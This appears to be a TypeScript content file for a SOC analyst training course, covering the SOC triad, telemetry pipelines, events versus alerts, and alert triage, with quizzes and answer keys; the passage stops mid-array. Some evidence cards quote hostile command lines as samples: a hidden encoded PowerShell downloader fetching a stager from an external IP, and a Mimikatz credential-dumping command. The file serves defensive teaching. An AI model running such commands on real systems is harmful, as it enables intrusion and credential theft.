import { MatchPair } from '@/components/learning/matching-check-shuffled';
import { TriageScenario } from '@/components/learning/tp-fp-triage';

export interface TopicDemoStep {
  id?: number;
  stepNumber?: number;
  stage?: string;
  iconName?: string;
  title: string;
  description: string;
  telemetrySnippet?: string;
  highlightText?: string;
  visualType?: string;
  highlightElements?: string[];
  narration?: string;
}

export interface TopicEvidenceCard {
  id: string;
  category?: string;
  title?: string;
  source?: string;
  timestamp?: string;
  summary?: string;
  details?: Array<{ label: string; value: string }>;
  isSuspicious?: boolean;
  relevanceScore?: number;
  tags?: string[];
  label?: string;
  detailedFindings?: string;
  severityIndicator?: string;
}

export interface TopicDragDropItem {
  id: string;
  label: string;
  order?: number;
  category?: string;
}

export interface TopicContent {
  id: string;
  unitId: string;
  title: string;
  order: number;
  estimatedMinutes: number;
  xpReward: number;

  // 1. Theory (Concise, educational explanation + Know More)
  theory: {
    summaryLines: string[];
    knowMore: {
      title: string;
      description: string;
      externalUrl: string;
      externalLabel: string;
    };
  };

  // 2. Demo (Visual story / video-like animation: watch & understand)
  demo: {
    title: string;
    subtitle: string;
    steps: TopicDemoStep[];
  };

  // 3. Interactive (Hands-on investigation: click & engage)
  interactive: {
    title: string;
    scenario: string;
    cards: TopicEvidenceCard[];
  };

  // 4. Real-world SOC Context
  socContext: {
    title: string;
    scenario: string;
    analystMindset: string;
    bestPractices: string[];
  };

  // 5. Knowledge Checks
  knowledgeCheck: {
    dragDrop?: {
      title: string;
      instructions: string;
      items: TopicDragDropItem[];
      explanation: string;
    };
    matching?: {
      title: string;
      instructions: string;
      pairs: MatchPair[];
      explanation: string;
    };
    triageScenario?: TriageScenario;
  };
}

export interface UnitAssessmentQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
}

export interface UnitStructure {
  id: string;
  unitNumber: number;
  title: string;
  description: string;
  estimatedHours: number;
  topics: TopicContent[];
  assessment: {
    id: string;
    title: string;
    passingScore: number;
    xpReward: number;
    questions: UnitAssessmentQuestion[];
  };
}

export const MODULE_04_UNITS: UnitStructure[] = [
  // =========================================================================
  // UNIT 1: SOC ARCHITECTURE
  // =========================================================================
  {
    id: 'unit-1',
    unitNumber: 1,
    title: 'Unit 1: SOC Architecture',
    description: 'Master the core SOC foundation: the People, Process, and Technology triad and the end-to-end data ingestion pipeline.',
    estimatedHours: 2,
    topics: [
      {
        id: 'topic-1-1',
        unitId: 'unit-1',
        title: 'SOC Triad: People, Process & Technology',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'A Security Operations Center (SOC) is the centralized cyber defense nerve center for an organization.',
            'Just like a 911 emergency response center, a SOC relies on a triad: skilled People (analysts), defined Processes (playbooks & SLAs), and Technology (monitoring tools).',
            'People: Tier 1 Triage Sentries triage alerts 24/7; Tier 2 Incident Hunters investigate root cause; Tier 3 Threat Hunters hunt stealthy adversaries; the SOC Manager steers operations.',
            'Process: Standard Operating Procedures (SOPs), Playbooks, and Service Level Agreements (SLAs) ensure fast, consistent response times under pressure.',
            'Technology: Central telemetry SIEM brains, EDR host visibility, and SOAR automated response engines work together to neutralize threats.',
          ],
          knowMore: {
            title: 'SANS SOC Architecture & Maturity Model',
            description: 'Learn how modern enterprise SOCs balance human expertise, structured playbooks, and automated detection platforms.',
            externalUrl: 'https://www.sans.org/white-papers/soc-survey/',
            externalLabel: 'Read SANS SOC Research',
          },
        },
        demo: {
          title: 'The 911 Dispatch Analogy & SOC Triad',
          subtitle: 'Visualizing how human analysts, standard procedures, and technology platforms fuse into unified defense.',
          steps: [
            {
              stepNumber: 1,
              title: 'The Cyber Emergency Center',
              description: 'Think of a SOC like an emergency dispatch room: thousands of sensor inputs arrive constantly, requiring quick triage to save assets.',
              visualType: 'network',
              highlightElements: ['soc-nerve-center', '24-7-monitoring'],
              narration: 'A SOC operates around the clock to detect, analyze, and neutralize attacks before business harm occurs.',
            },
            {
              stepNumber: 2,
              title: 'The Three Pillars',
              description: 'Without skilled People, tools create blind noise. Without Process, teams panic. Without Technology, humans drown in logs.',
              visualType: 'dashboard',
              highlightElements: ['people', 'process', 'technology'],
              narration: 'True cyber resilience requires balance across all three pillars.',
            },
          ],
        },
        interactive: {
          title: 'SOC Triad Blueprint Explorer',
          scenario: 'Explore the roles and responsibilities of People, Process, and Technology in stopping an active ransomware outbreak.',
          cards: [
            {
              id: 'card-people',
              title: 'People (The Defense Force)',
              source: 'Tiering Structure',
              timestamp: 'Role Definition',
              category: 'host',
              summary: 'L1 Sentries handle 15-minute triage; L2 Hunters scope lateral movement; L3 Specialists conduct malware analysis and hunting.',
              details: [
                { label: 'Tier 1 Focus', value: 'Queue hygiene, false-positive filtering, alert validation' },
                { label: 'Tier 2 Focus', value: 'Forensic host scoping, reverse engineering, containment' },
                { label: 'Tier 3 Focus', value: 'Proactive adversary hunting, root-cause threat intelligence' },
              ],
              isSuspicious: false,
              relevanceScore: 95,
              tags: ['People', 'Tiers', 'Triage'],
            },
            {
              id: 'card-process',
              title: 'Process (The Rules of Engagement)',
              source: 'Standard Operating Procedures',
              timestamp: 'Execution Guidelines',
              category: 'user',
              summary: 'Repeatable playbooks and SLAs mandate exact steps for phishing, ransomware, credential abuse, and DDoS attacks.',
              details: [
                { label: 'SLA Guarantee', value: 'Critical alerts must be triaged within 15 minutes' },
                { label: 'Playbook Benefit', value: 'Eliminates guesswork during high-stress crisis moments' },
              ],
              isSuspicious: false,
              relevanceScore: 90,
              tags: ['Process', 'SLA', 'Playbooks'],
            },
            {
              id: 'card-tech',
              title: 'Technology (The Defensive Arsenal)',
              source: 'Security Stack',
              timestamp: 'Sensor Network',
              category: 'network',
              summary: 'SIEM aggregates logs; EDR monitors processes and memory on workstations; SOAR executes automatic containment scripts.',
              details: [
                { label: 'SIEM Role', value: 'Correlation engine aggregating cloud, network, and endpoint logs' },
                { label: 'EDR Role', value: 'Deep host inspection, process tree tracing, remote isolation' },
              ],
              isSuspicious: false,
              relevanceScore: 92,
              tags: ['Technology', 'SIEM', 'EDR'],
            },
          ],
        },
        socContext: {
          title: 'Real-World SOC Deployment',
          scenario: 'At 03:00 AM on Sunday, a global manufacturing enterprise experiences an unauthorized domain controller sync attempt.',
          analystMindset: 'Technology flagged the behavioral anomaly, the process dictated an immediate P1 bridge, and the analyst confirmed the threat and isolated the attacker.',
          bestPractices: [
            'Never rely on automated tools alone; human context confirms intent.',
            'Regularly update playbooks after every major post-incident review.',
            'Maintain strict SLA tracking to prevent alert queue stagnation.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Match the Triad Element to its Function',
            instructions: 'Pair each pillar with its core responsibility in the SOC.',
            pairs: [
              { id: 'triad-1', left: 'People', right: 'Triage alerts, conduct investigations, and decide containment actions' },
              { id: 'triad-2', left: 'Process', right: 'Playbooks and SLAs that ensure consistent, repeatable response' },
              { id: 'triad-3', left: 'Technology', right: 'SIEM, EDR, and SOAR tools collecting and correlating telemetry' },
              { id: 'triad-4', left: 'SOC Manager', right: 'Oversees operational metrics, team staffing, and executive briefings' },
            ],
            explanation: 'The triad operates synergistically: People execute Processes powered by Technology.',
          },
        },
      },
      {
        id: 'topic-1-2',
        unitId: 'unit-1',
        title: 'Data Flow & Telemetry Ingestion Pipeline',
        order: 2,
        estimatedMinutes: 25,
        xpReward: 50,
        theory: {
          summaryLines: [
            'Security operations depends on real-time telemetry from across the entire corporate infrastructure.',
            'The data flow journey: Host & network events are generated on endpoints, collected by local lightweight agents (e.g. Sysmon, Winlogbeat, Osquery).',
            'Forwarders transport raw logs across corporate firewalls to collectors and message brokers (e.g. Kafka).',
            'Normalizers and parsers convert disparate vendor formats into a standardized schema (such as Elastic Common Schema - ECS or CIM).',
            'The SIEM ingests normalized logs, indexes them for high-speed queries, runs correlation rules, and pushes alerts into the analyst queue.',
          ],
          knowMore: {
            title: 'Elastic Common Schema (ECS) Reference',
            description: 'Explore how standardizing log field names enables correlation across thousands of different security vendors.',
            externalUrl: 'https://www.elastic.co/guide/en/ecs/current/index.html',
            externalLabel: 'Browse ECS Documentation',
          },
        },
        demo: {
          title: 'The Real-Time Telemetry Pipeline',
          subtitle: 'From local keyboard event to SIEM triage alert in under 2 seconds.',
          steps: [
            {
              stepNumber: 1,
              title: 'Endpoint Event Generation',
              description: 'An employee executes a command; the OS kernel records Event ID 4688 / Sysmon Event ID 1.',
              visualType: 'terminal',
              highlightElements: ['endpoint', 'event-generation'],
              narration: 'Every process spawn and network socket is recorded at the endpoint level.',
            },
            {
              stepNumber: 2,
              title: 'Ingestion & Correlation',
              description: 'The forwarder streams the event to the SIEM, where correlation rules trigger an analyst alert within seconds.',
              visualType: 'network',
              highlightElements: ['forwarder', 'siem-parser', 'alert-queue'],
              narration: 'Normalization allows the detection engine to evaluate malicious behavioral patterns.',
            },
          ],
        },
        interactive: {
          title: 'Pipeline Latency & Tuning Simulator',
          scenario: 'Interact with the pipeline parameters to observe how ingestion lag and normalization errors impact threat detection.',
          cards: [
            {
              id: 'card-agent',
              title: 'Endpoint Agent (Forwarder)',
              source: 'Workstation Fleet',
              timestamp: 'T+0.2s',
              category: 'host',
              summary: 'Lightweight agent capturing Sysmon telemetry and batching events securely over TLS.',
              details: [
                { label: 'Buffer Size', value: '50 MB local ring buffer' },
                { label: 'Transmission Delay', value: '0.4 seconds' },
              ],
              isSuspicious: false,
              relevanceScore: 88,
              tags: ['Agent', 'Telemetry', 'Sysmon'],
            },
            {
              id: 'card-parser',
              title: 'Log Parser & Normalizer',
              source: 'Logstash / Ingest Node',
              timestamp: 'T+0.8s',
              category: 'network',
              summary: 'Translates raw syslog into standardized fields: `process.name`, `source.ip`, and `user.name`.',
              details: [
                { label: 'Schema Standard', value: 'Elastic Common Schema (ECS)' },
                { label: 'Parse Failure Rate', value: '< 0.01%' },
              ],
              isSuspicious: false,
              relevanceScore: 92,
              tags: ['Parser', 'ECS', 'Normalization'],
            },
            {
              id: 'card-siem',
              title: 'SIEM Correlation Engine',
              source: 'Detection Engine',
              timestamp: 'T+1.4s',
              category: 'user',
              summary: 'Matches normalized event stream against 450+ active detection rules to trigger actionable alerts.',
              details: [
                { label: 'Rule Evaluated', value: 'Suspicious PowerShell Spawn from Office App' },
                { label: 'Alert Generation', value: 'Instant push to L1 analyst queue' },
              ],
              isSuspicious: true,
              relevanceScore: 98,
              tags: ['SIEM', 'Correlation', 'Alert'],
            },
          ],
        },
        socContext: {
          title: 'The Danger of Ingestion Lag',
          scenario: 'A network bottleneck caused log ingestion delays of 45 minutes on web server logs.',
          analystMindset: 'During that 45-minute blind spot, an attacker successfully uploaded a web shell and dumped credentials before the first alert reached the queue.',
          bestPractices: [
            'Continuously monitor ingestion latency metrics; alerts older than 5 minutes indicate pipeline congestion.',
            'Ensure all forwarders have local disk caching to prevent log loss during network disconnects.',
            'Standardize on common schemas (ECS/CIM) so search queries work identically across all log sources.',
          ],
        },
        knowledgeCheck: {
          dragDrop: {
            title: 'Order the Telemetry Pipeline Stages',
            instructions: 'Arrange the stages in order from event creation to analyst screen.',
            items: [
              { id: 'p1', label: '1. Endpoint Event Spawn (Sysmon Event ID 1)', category: 'Stage 1' },
              { id: 'p2', label: '2. Forwarder Agent Transmission over TLS', category: 'Stage 2' },
              { id: 'p3', label: '3. Log Parser & Field Normalization (ECS)', category: 'Stage 3' },
              { id: 'p4', label: '4. SIEM Correlation Rule Match & Queue Alert', category: 'Stage 4' },
            ],
            explanation: 'Logs originate at endpoints, travel via forwarders, are normalized by parsers, and trigger SIEM alerts.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-1-assessment',
      title: 'Unit 1 Assessment: SOC Architecture',
      passingScore: 80,
      xpReward: 150,
      questions: [
        {
          id: 'u1-q1',
          question: 'What are the three core pillars of the SOC triad?',
          options: [
            'Firewalls, Antivirus, and Backups',
            'People, Process, and Technology',
            'Hardware, Software, and Network Cables',
            'Managers, Developers, and System Admins',
          ],
          correctAnswer: 1,
          explanation: 'The SOC triad is composed of People (analysts), Process (playbooks & SLAs), and Technology (SIEM, EDR).',
        },
        {
          id: 'u1-q2',
          question: 'What is the primary role of a Tier 1 (L1) SOC Analyst?',
          options: [
            'Writing company security policies and purchasing software',
            'Initial alert triage, false-positive filtering, and escalating true threats',
            'Reverse engineering malware binaries and firmware',
            'Physically repairing damaged server hardware in the datacenter',
          ],
          correctAnswer: 1,
          explanation: 'Tier 1 analysts act as the 24/7 frontline triage sentries, reviewing alert queues and filtering false positives.',
        },
        {
          id: 'u1-q3',
          question: 'Why is log field normalization (e.g. ECS or CIM) essential in a modern SIEM?',
          options: [
            'It changes all log timestamps into alphabetical letters',
            'It maps different vendor log formats into unified field names so correlation rules work across all systems',
            'It deletes 90% of log files to save hard drive space',
            'It hides the identity of the analyst who viewed the log',
          ],
          correctAnswer: 1,
          explanation: 'Normalization maps disparate vendor schemas (e.g., `src_ip`, `SourceAddress`, `ip_src`) into one standard field (`source.ip`).',
        },
        {
          id: 'u1-q4',
          question: 'What is the operational consequence of high ingestion lag in a telemetry pipeline?',
          options: [
            'The SIEM runs out of license keys',
            'Adversaries gain dwell time because analysts receive alerts long after the attack occurred',
            'Workstations will reboot automatically without warning',
            'Alerts become false positives automatically',
          ],
          correctAnswer: 1,
          explanation: 'Ingestion lag delays alerts, giving adversaries unmonitored dwell time to move laterally and exfiltrate data.',
        },
        {
          id: 'u1-q5',
          question: 'Which tool provides deep host visibility into running processes, loaded DLLs, and memory?',
          options: [
            'Network Switch',
            'Endpoint Detection and Response (EDR)',
            'Domain Name System (DNS)',
            'Load Balancer',
          ],
          correctAnswer: 1,
          explanation: 'EDR agents reside directly on endpoints, providing real-time visibility into process executions, DLL loads, and network sockets.',
        },
      ],
    },
  },

  // =========================================================================
  // UNIT 2: ALERTS & EVENTS
  // =========================================================================
  {
    id: 'unit-2',
    unitNumber: 2,
    title: 'Unit 2: Alerts & Events',
    description: 'Understand the critical differences between raw system events, triggered alerts, verified incidents, and master investigation cases.',
    estimatedHours: 2,
    topics: [
      {
        id: 'topic-2-1',
        unitId: 'unit-2',
        title: 'Events vs. Alerts: Signal from Noise',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'An Event is any observable occurrence in an IT system (e.g., a file written, a user login, a DNS query).',
            'An enterprise generates billions of events daily—99.999% of which are normal, routine business activities.',
            'An Alert is generated only when an event (or group of correlated events) matches a predefined detection rule or anomaly threshold.',
            'For example: A single failed password attempt is a routine Event (Event ID 4625). 200 failed attempts within 60 seconds triggers a Brute-Force Alert.',
            'Analysts must never treat raw events as alarms until verified by correlation rules and contextual evidence.',
          ],
          knowMore: {
            title: 'MITRE ATT&CK: Detection & Behavioral Analytics',
            description: 'Learn how modern detection engineers craft rules that convert high-volume telemetry into actionable alerts.',
            externalUrl: 'https://attack.mitre.org/',
            externalLabel: 'Explore MITRE ATT&CK Matrix',
          },
        },
        demo: {
          title: 'From 1,000,000 Events to 1 High-Fidelity Alert',
          subtitle: 'Visualizing how SIEM correlation rules filter background noise to pinpoint malicious behavior.',
          steps: [
            {
              stepNumber: 1,
              title: 'The Raw Event Flood',
              description: 'Hundreds of thousands of routine events arrive every second: email syncs, background services, network pings.',
              visualType: 'network',
              highlightElements: ['event-flood', 'routine-noise'],
              narration: 'Without correlation, an analyst would drown in routine events within seconds.',
            },
            {
              stepNumber: 2,
              title: 'The Correlation Filter',
              description: 'A threshold rule triggers when a single user account fails authentication 15 times and then immediately succeeds from an overseas IP.',
              visualType: 'dashboard',
              highlightElements: ['threshold-filter', 'alert-triggered'],
              narration: 'The correlation rule filters the noise and generates an actionable alert.',
            },
          ],
        },
        interactive: {
          title: 'Event vs. Alert Interactive Classifier',
          scenario: 'Review 3 incoming log telemetry snippets and classify whether each item is merely a raw Event or a qualified Alert.',
          cards: [
            {
              id: 'card-ev1',
              title: 'Kerberos Ticket Granting Request',
              source: 'Domain Controller',
              timestamp: '14:22:01 UTC',
              category: 'user',
              summary: 'Standard Kerberos TGS request from user `accounting_mgr` to access the departmental file share.',
              details: [
                { label: 'Event ID', value: '4769' },
                { label: 'Ticket Encryption', value: 'AES256 (Standard)' },
                { label: 'Classification', value: 'Routine System Event' },
              ],
              isSuspicious: false,
              relevanceScore: 20,
              tags: ['Event', 'Kerberos', 'Normal'],
            },
            {
              id: 'card-ev2',
              title: 'PowerShell Encoded Command & External Socket',
              source: 'Finance Laptop',
              timestamp: '14:22:45 UTC',
              category: 'host',
              summary: '`powershell.exe -enc JABjAGwAaQ...` executed by Word macro, opening connection to unclassified external IP.',
              details: [
                { label: 'Rule Triggered', value: 'Suspicious Living-Off-The-Land Binary' },
                { label: 'Classification', value: 'High-Severity Alert' },
              ],
              isSuspicious: true,
              relevanceScore: 98,
              tags: ['Alert', 'Malicious', 'Living-off-the-Land'],
            },
            {
              id: 'card-ev3',
              title: 'DNS Query to Known CDN',
              source: 'Core Gateway',
              timestamp: '14:23:10 UTC',
              category: 'network',
              summary: 'Outbound DNS lookup for `cdn.cloudflare.net` resolving successfully with TTL 300.',
              details: [
                { label: 'Reputation', value: 'Clean / Reputable CDN' },
                { label: 'Classification', value: 'Routine Network Event' },
              ],
              isSuspicious: false,
              relevanceScore: 15,
              tags: ['Event', 'DNS', 'Clean'],
            },
          ],
        },
        socContext: {
          title: 'Alert Fatigue in the SOC',
          scenario: 'A poorly configured SIEM rule generated 1,400 alerts whenever any user changed their screen resolution.',
          analystMindset: 'Alert fatigue causes analysts to overlook legitimate threats. Rules must be tuned so that every alert represents a genuine anomaly requiring human decision.',
          bestPractices: [
            'Require multiple correlated events before firing a high-priority alert.',
            'Review alert-to-incident ratios monthly; rules generating 0 incidents should be tuned or retired.',
            'Correlate threat intelligence feeds directly into SIEM queries to boost alert fidelity.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Classify Telemetry: Event vs. Alert',
            instructions: 'Match each item with whether it represents a raw Event or an Alert.',
            pairs: [
              { id: 'ea-1', left: 'Single successful VPN login during office hours', right: 'Raw Event' },
              { id: 'ea-2', left: '150 failed SSH logins followed by root login in 30 seconds', right: 'Security Alert' },
              { id: 'ea-3', left: 'Workstation requests DHCP IP address renewal', right: 'Raw Event' },
              { id: 'ea-4', left: 'Process memory dump tool `lsass.exe` accessed by untrusted binary', right: 'Security Alert' },
            ],
            explanation: 'Events record normal or raw system activity; Alerts signify rule violations or suspicious behavior patterns.',
          },
        },
      },
      {
        id: 'topic-2-2',
        unitId: 'unit-2',
        title: 'Incidents vs. Cases: The Escalation Lifecycle',
        order: 2,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'An Alert is an unverified notification that a rule was triggered.',
            'An Incident is declared when an alert is investigated and confirmed to pose an active threat or violation of security policy.',
            'Not all alerts become incidents: an alert triggered by an authorized IT penetration test is an alert, but not an unplanned incident.',
            'A Case is the formal container or digital folder in the ticketing system (e.g. ServiceNow SecOps, Jira, TheHive).',
            'A single Case bundles all correlated alerts, affected endpoints, user identities, timeline notes, evidence files, and remediation tasks together.',
          ],
          knowMore: {
            title: 'NIST SP 800-61 Rev. 2: Incident Handling Guide',
            description: 'The industry-standard computer security incident handling lifecycle from preparation to post-incident activity.',
            externalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final',
            externalLabel: 'Read NIST SP 800-61',
          },
        },
        demo: {
          title: 'From Alert to Incident to Case',
          subtitle: 'Tracing the complete lifecycle of a confirmed security incident.',
          steps: [
            {
              stepNumber: 1,
              title: 'Alert Triage Validation',
              description: 'The analyst reviews the raw alert, inspects command parameters, and confirms unauthorized malicious execution.',
              visualType: 'terminal',
              highlightElements: ['alert-review', 'confirmation'],
              narration: 'Once verified as malicious, the alert is declared an Incident.',
            },
            {
              stepNumber: 2,
              title: 'Case Aggregation',
              description: 'The analyst creates a Case container, binding 3 related alerts, 2 affected hosts, and the compromised user into a single ticket.',
              visualType: 'dashboard',
              highlightElements: ['case-creation', 'evidence-binding'],
              narration: 'The Case serves as the master record for response, containment, and post-mortem analysis.',
            },
          ],
        },
        interactive: {
          title: 'Incident Lifecycle Progression Simulator',
          scenario: 'Walk an active security event through its lifecycle: from raw log to alert, incident confirmation, and case creation.',
          cards: [
            {
              id: 'card-lc1',
              title: 'Phase 1: Raw Telemetry (Event)',
              source: 'Edge Firewall',
              timestamp: '10:00:00 UTC',
              category: 'network',
              summary: 'Inbound connection attempts observed on port 445 (SMB) from external IP.',
              details: [
                { label: 'Volume', value: '1 packet' },
                { label: 'Status', value: 'Logged by Firewall' },
              ],
              isSuspicious: false,
              relevanceScore: 30,
              tags: ['Event', 'Raw'],
            },
            {
              id: 'card-lc2',
              title: 'Phase 2: Detection Rule Triggered (Alert)',
              source: 'SIEM Correlation Rule',
              timestamp: '10:01:15 UTC',
              category: 'user',
              summary: 'Rule fired: `Port 445 Sweep across Internal Subnet from Workstation-09`.',
              details: [
                { label: 'Severity', value: 'High' },
                { label: 'Queue Status', value: 'Pending L1 Triage' },
              ],
              isSuspicious: true,
              relevanceScore: 85,
              tags: ['Alert', 'Rule Match'],
            },
            {
              id: 'card-lc3',
              title: 'Phase 3: Confirmed Malicious Breach (Incident & Case)',
              source: 'Incident Response Ticket #SEC-892',
              timestamp: '10:06:30 UTC',
              category: 'host',
              summary: 'Workstation-09 confirmed infected with lateral-movement worm. Case #SEC-892 opened for multi-host isolation.',
              details: [
                { label: 'Status', value: 'Active P1 Incident' },
                { label: 'Assigned To', value: 'L2 IR Lead & Threat Hunter' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['Incident', 'Case', 'Active Threat'],
            },
          ],
        },
        socContext: {
          title: 'Managing Complex Multi-Alert Cases',
          scenario: 'An attacker compromised an employee laptop, moved to a staging server, and attempted database exfiltration, triggering 12 separate alerts.',
          analystMindset: 'Treating each alert as a separate ticket creates chaos. The analyst binds all 12 alerts into a single unified Case with one incident commander.',
          bestPractices: [
            'Group related alerts by attacker IP, session ID, or host to keep investigations unified.',
            'Never close an incident ticket until containment, eradication, and recovery steps are verified.',
            'Always document root-cause evidence within the case for future compliance audits.',
          ],
        },
        knowledgeCheck: {
          dragDrop: {
            title: 'Order the Security Operations Hierarchy',
            instructions: 'Rank the terms from most granular to broadest operational container.',
            items: [
              { id: 'hier-1', label: '1. Event (Single atomic system action)', category: 'Most Granular' },
              { id: 'hier-2', label: '2. Alert (Threshold or correlation rule triggered)', category: 'Second Level' },
              { id: 'hier-3', label: '3. Incident (Verified security policy violation)', category: 'Third Level' },
              { id: 'hier-4', label: '4. Case (Container tracking all alerts, evidence & tasks)', category: 'Broadest Container' },
            ],
            explanation: 'Events feed into Alerts; confirmed alerts become Incidents; all related artifacts are managed inside a Case.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-2-assessment',
      title: 'Unit 2 Assessment: Alerts & Events',
      passingScore: 80,
      xpReward: 150,
      questions: [
        {
          id: 'u2-q1',
          question: 'What is the key difference between a raw Event and a security Alert?',
          options: [
            'Events are stored on USB drives while alerts are printed on paper',
            'An event is any observed system action; an alert is generated only when an event matches a detection rule',
            'Events only happen on Linux; alerts only happen on Windows',
            'There is no difference; the two words mean the exact same thing',
          ],
          correctAnswer: 1,
          explanation: 'Events are raw occurrences (billions daily); alerts are high-priority notifications generated by correlation rules.',
        },
        {
          id: 'u2-q2',
          question: 'When does a security alert formally become classified as an Incident?',
          options: [
            'When the alert is older than 30 days',
            'When an analyst investigates and confirms that an active threat or policy breach has actually occurred',
            'When the company CEO sends an email asking for an update',
            'When the alert rule is deleted from the SIEM',
          ],
          correctAnswer: 1,
          explanation: 'An alert becomes an incident when human or automated triage confirms it is a genuine, harmful security event.',
        },
        {
          id: 'u2-q3',
          question: 'What is the purpose of a Case in an incident management system (e.g. ServiceNow, TheHive)?',
          options: [
            'It serves as the unified folder holding all related alerts, evidence, affected assets, and analyst notes',
            'It encrypts the hard drive so nobody can read the logs',
            'It automatically deletes all emails from the attacker',
            'It prevents the analyst from logging out of their computer',
          ],
          correctAnswer: 0,
          explanation: 'A Case aggregates all alerts, forensic artifacts, timeline notes, and tasks related to a single attack campaign.',
        },
        {
          id: 'u2-q4',
          question: 'What dangerous condition occurs when a SIEM produces excessive irrelevant or noisy alerts?',
          options: [
            'Hardware overheating',
            'Alert fatigue, causing analysts to miss real critical attacks',
            'Instant network bandwidth failure',
            'Immediate data encryption',
          ],
          correctAnswer: 1,
          explanation: 'Alert fatigue desensitizes analysts, leading to delayed response times and missed intrusions.',
        },
        {
          id: 'u2-q5',
          question: 'Which of the following is an example of a confirmed Incident rather than a benign Event?',
          options: [
            'An employee resets their password via the official self-service portal',
            'A scheduled cron job backs up database tables at midnight',
            'Ransomware binaries actively encrypting files on the departmental file server',
            'A web browser loads an image from a reputable advertising CDN',
          ],
          correctAnswer: 2,
          explanation: 'Active file encryption on a corporate server is an undeniable, high-severity security incident.',
        },
      ],
    },
  },

  // =========================================================================
  // UNIT 3: ALERT TRIAGE
  // =========================================================================
  {
    id: 'unit-3',
    unitNumber: 3,
    title: 'Unit 3: Alert Triage',
    description: 'Master the frontline triage methodology: dissecting alert logic, identifying key entities (User, Host, IP), analyzing raw evidence, and executing hands-on triage.',
    estimatedHours: 2.5,
    topics: [
      {
        id: 'topic-3-1',
        unitId: 'unit-3',
        title: 'Understanding the Alert & Checking Evidence',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'Alert triage is the systematic evaluation of an incoming alert within the first 5 to 15 minutes of detection.',
            'Step 1: Understand the Alert Logic. Read the rule description, triggered condition, and associated MITRE ATT&CK technique (e.g., T1059.001 - PowerShell).',
            'Step 2: Inspect the Raw Telemetry & Evidence. Do not trust the alert title alone; check the process execution command line, parent process, and file hashes.',
            'Step 3: Check for Obfuscation. Attackers frequently use base64 encoding, environment variables, or string reversal to hide malicious payloads.',
            'Step 4: Form an Initial Hypothesis. Is this execution consistent with normal user duties or signs of an active living-off-the-land intrusion?',
          ],
          knowMore: {
            title: 'SANS Triage Playbook: The First 15 Minutes',
            description: 'Standard operating procedures for rapid initial alert dissection and evidence verification.',
            externalUrl: 'https://www.sans.org/',
            externalLabel: 'Explore SANS Incident Response Resources',
          },
        },
        demo: {
          title: 'Dissecting an Alert Payload',
          subtitle: 'Step-by-step deconstruction of an obfuscated command-line alert.',
          steps: [
            {
              stepNumber: 1,
              title: 'The Inbound Alert Header',
              description: 'Alert Title: "Suspicious PowerShell Encoded Script Execution" flagged on finance workstation.',
              visualType: 'dashboard',
              highlightElements: ['alert-header', 'severity-high'],
              narration: 'The analyst opens the alert record and inspects the raw triggering event.',
            },
            {
              stepNumber: 2,
              title: 'Decoding the Evidence',
              description: 'Raw payload: `powershell -nop -w hidden -enc SQBFAFgA...` decoded reveals `Invoke-WebRequest -Uri http://185.220.101.5/stager.exe`.',
              visualType: 'terminal',
              highlightElements: ['decoded-script', 'c2-ip'],
              narration: 'Evidence confirms an active downloader retrieving second-stage malware from an external C2 server.',
            },
          ],
        },
        interactive: {
          title: 'Evidence Inspector: Base64 & Process Trees',
          scenario: 'Examine raw evidence fields from 3 alerts to determine which contains actionable malicious artifacts.',
          cards: [
            {
              id: 'card-evid1',
              title: 'Payload Analysis: Base64 Decoded',
              source: 'Process Line Inspection',
              timestamp: '11:14:02 UTC',
              category: 'host',
              summary: 'Decoded script reveals command: `Invoke-Mimikatz -DumpCreds` targeting LSASS memory.',
              details: [
                { label: 'Attacker Intent', value: 'Credential Theft / Memory Dump' },
                { label: 'Verdict', value: 'High Confidence Malicious True Positive' },
              ],
              isSuspicious: true,
              relevanceScore: 99,
              tags: ['Mimikatz', 'Evidence', 'Credential-Dumping'],
            },
            {
              id: 'card-evid2',
              title: 'Parent-Child Process Relationship',
              source: 'Endpoint Process Hierarchy',
              timestamp: '11:14:05 UTC',
              category: 'host',
              summary: 'Parent: `excel.exe` -> Child: `cmd.exe` -> Grandchild: `powershell.exe`.',
              details: [
                { label: 'Anomaly', value: 'Spreadsheet software should never spawn command-line shells' },
                { label: 'Verdict', value: 'Macro-based Initial Stager Execution' },
              ],
              isSuspicious: true,
              relevanceScore: 95,
              tags: ['Process-Tree', 'Malicious', 'Macro'],
            },
            {
              id: 'card-evid3',
              title: 'Software Updater Process Execution',
              source: 'System Maintenance Task',
              timestamp: '11:15:00 UTC',
              category: 'host',
              summary: 'Parent: `services.exe` -> Child: `GoogleUpdate.exe` with valid digital signature.',
              details: [
                { label: 'Digital Signature', value: 'Valid Google LLC Certificate' },
                { label: 'Verdict', value: 'Routine Benign System Activity' },
              ],
              isSuspicious: false,
              relevanceScore: 10,
              tags: ['Benign', 'Signed', 'Update'],
            },
          ],
        },
        socContext: {
          title: 'Never Rely on Alert Names Alone',
          scenario: 'An alert named "Generic Windows Warning" was dismissed by an inexperienced analyst, masking a multi-stage ransomware staging attack.',
          analystMindset: 'Alert titles are generated by rule authors; the ground truth resides exclusively inside the raw process telemetry and network socket logs.',
          bestPractices: [
            'Always inspect full command-line arguments, including encoded or concatenated strings.',
            'Verify digital signatures on executing binaries before assuming legitimacy.',
            'Examine parent-child process relationships for unnatural anomalies (e.g. Office apps spawning shells).',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Match Evidence Artifacts to Investigation Meaning',
            instructions: 'Pair each evidence artifact with what it tells the triage analyst.',
            pairs: [
              { id: 'tri-1', left: 'Parent: WINWORD.EXE -> Child: powershell.exe', right: 'Malicious macro document execution' },
              { id: 'tri-2', left: 'Base64 encoded string with `-enc` flag', right: 'Obfuscated command hiding attacker intent' },
              { id: 'tri-3', left: 'Digital Signature: Verified Microsoft Windows', right: 'Legitimate OS component (verify for DLL hijacking)' },
